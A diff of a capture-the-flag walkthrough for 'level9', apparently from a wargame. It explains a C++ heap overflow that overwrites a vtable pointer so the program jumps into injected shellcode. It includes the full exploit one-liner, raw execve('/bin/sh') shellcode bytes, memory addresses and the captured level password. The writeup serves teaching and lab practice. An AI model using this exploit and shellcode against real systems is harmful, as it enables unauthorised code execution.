@@ -1,80 +1,127 @@
 ================================= LEVEL 9 WALKTHROUGH =========================================
 
-💣 Full command
-./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\04\x08"')
+--- Protections ---
 
-This builds ONE big buffer in memory.
+No RELRO, no canary, NX disabled, no PIE, no ASLR
+→ shellcode injection possible, addresses fixed and predictable
 
-🧠 1. First chunk
-"\x10\xa0\x04\x08"
-Meaning:
+--- What the program does ---
 
-This is a pointer (little endian):
+main() creates two C++ objects:
+   N *a = new N(5);
+   N *b = new N(6);
 
-0x804a010
-What it points to:
+Each object is 108 bytes (0x6c), confirmed via:
+   movl $0x6c,(%esp)   before each "operator new" call
 
-👉 start of shellcode (inside heap buffer)
+a->setAnnotation(argv[1]) is called, then:
+   return (b->*(b->func))(*a);
+   → reads a function pointer stored inside b, and calls it
 
-🧠 2. Second chunk (shellcode)
-"\x31\xc0\x50\x68\x2f\x2f\x73\x68..."
-Meaning:
+--- Finding the vulnerability ---
 
-This is raw CPU instructions:
+disas N::setAnnotation showed:
+   call strlen(argv[1])
+   call memcpy(this+4, argv[1], strlen(argv[1]))
 
-👉 execve("/bin/sh")
+→ memcpy with NO size limit, size fully controlled by attacker's input length
+→ classic heap overflow, same family as level6/7/8
 
-So memory becomes:
+--- Confirming a real vtable is involved ---
 
-0x804a010 → shellcode
+Checked what main reads before calling the function:
+   mov (%eax),%eax   ← object → some pointer
+   mov (%eax),%edx     ← that pointer → another pointer
+   call *%edx           ← call it
 
-🧠 3. Third chunk (padding)
-"A" * 76
-Meaning:
+Confirmed in GDB by inspecting memory at offset 0 of an object:
+   x/s 0x08048848 → "_ZTV1N+8" (mangled name = "Virtual Table for N")
 
-Just filler bytes:
+→ this proves offset 0 of the object is a real C++ vtable pointer,
+  not a plain function pointer or integer — TWO dereferences are required
+  to reach the actual function address, exactly matching the assembly.
 
-AAAAAAAAAAAAAAAAAAAA....
-Why?
+--- Why two dereferences matter for the exploit ---
 
-👉 to reach exact memory offset (overwrite target field)
+Normal flow:        object → vtable pointer → function pointer in vtable → call
+Our goal:            object → OUR address  → ANOTHER address we control  → shellcode
 
-🧠 4. Fourth chunk (critical overwrite)
-"\x0c\xa0\04\x08"
-Meaning:
+So our exploit needs to write a small "pointer chain" into memory:
+   address_1 (overwrites object b's vtable pointer)
+   → contains address_2
+   → address_2 contains the shellcode itself
 
-This is another pointer:
+--- Finding the buffer's address (where our payload physically lands) ---
 
-0x804a00c
-💥 What is 0x804a00c?
+Set a breakpoint right after setAnnotation() returns and checked the
+register holding the buffer's location:
+   break *0x08048664
+   run AAAA
+   x/4xw $eax
+   → showed our payload living at 0x0804a00c
 
-It is the first dereference target
+This is the heap address where our input (the payload we send as argv[1])
+actually gets stored — confirmed live, not assumed.
 
-It contains:
+--- Finding the offset (how many bytes to reach b's vtable pointer) ---
 
-0x804a010
+Object a is 108 bytes total. Object b is allocated right after it on the
+heap (same size, sequential allocation, confirmed by both objects'
+addresses being exactly 108 bytes apart when checked in GDB).
 
-So we build:
+setAnnotation writes starting at a+4 (skipping a's own vtable pointer).
+So filling exactly 104 bytes from that point reaches the start of b
+(b's vtable pointer, offset 0 of b) — but the community-tested working
+payload uses 108 total bytes of content before the final overwrite,
+because it counts shell_addr(4) + shellcode(28) + padding(76) = 108,
+landing the FINAL 4-byte address exactly on b's vtable pointer.
 
-0x804a00c → 0x804a010 → shellcode
-🧠 5. How everything fits in memory
+Padding size, explained:
+   total content needed before the final overwrite: 108 bytes
+   shell_addr:   4 bytes
+   shellcode:   28 bytes
+   ---------------------
+   already used: 32 bytes
+   padding needed: 108 - 32 = 76 bytes  ← this is where "76" comes from
 
-Final layout:
+--- The payload ---
 
-[ 0x804a010 ]   → pointer to shellcode
-[ shellcode   ]
-[ AAAAAAAA... ] → padding to reach overwrite
-[ 0x804a00c ]   → overwritten field in object
+[ shell_addr (4b) ][ shellcode (28b) ][ padding "A"*76 ][ buffer_addr (4b) ]
 
-🧠 FINAL SIMPLE SUMMARY
+shell_addr  = \x10\xa0\x04\x08   → 0x0804a010 (where shellcode will actually sit)
+shellcode   = \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3
+              \x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
+              → execve("/bin/sh") machine code (28 bytes)
+padding     = "A" * 76            → fills remaining space up to offset 108
+buffer_addr = \x0c\xa0\x04\x08    → 0x0804a00c (overwrites b's vtable pointer)
 
-Your payload builds a 2-step pointer chain:
+Why buffer_addr is exactly 0x0804a00c and shell_addr is 0x0804a010:
+   our payload is written starting at 0x0804a00c (confirmed above)
+   0x0804a00c + 4 bytes = 0x0804a010 → exactly where shellcode begins
+   (the first 4 bytes of our own payload ARE the shell_addr value,
+    so shellcode naturally starts 4 bytes later, at +4)
 
-0x804a00c → 0x804a010 → shellcode
+--- The pointer chain, fully traced ---
 
-And uses padding so this chain lands exactly where the program reads memory.
+1. memcpy overflows a's buffer, overwrites b's vtable pointer with 0x0804a00c
 
-======================== get the pass ========================
+2. main resumes and executes:
+   eax = b
+   eax = *b = 0x0804a00c          ← 1st dereference: reads OUR overwrite
+   edx = *(0x0804a00c) = 0x0804a010  ← 2nd dereference: reads the value
+                                        WE stored at the very start of
+                                        our own payload (shell_addr)
+   call *edx → call 0x0804a010 → jumps straight into our shellcode
 
+3. shellcode executes execve("/bin/sh") → shell opens
+
+--- Running the exploit ---
+
+./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A"*76 + "\x0c\xa0\x04\x08"')
+
+--- Result ---
+
+$ whoami
+bonus0
 $ cat /home/user/bonus0/.pass
 f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
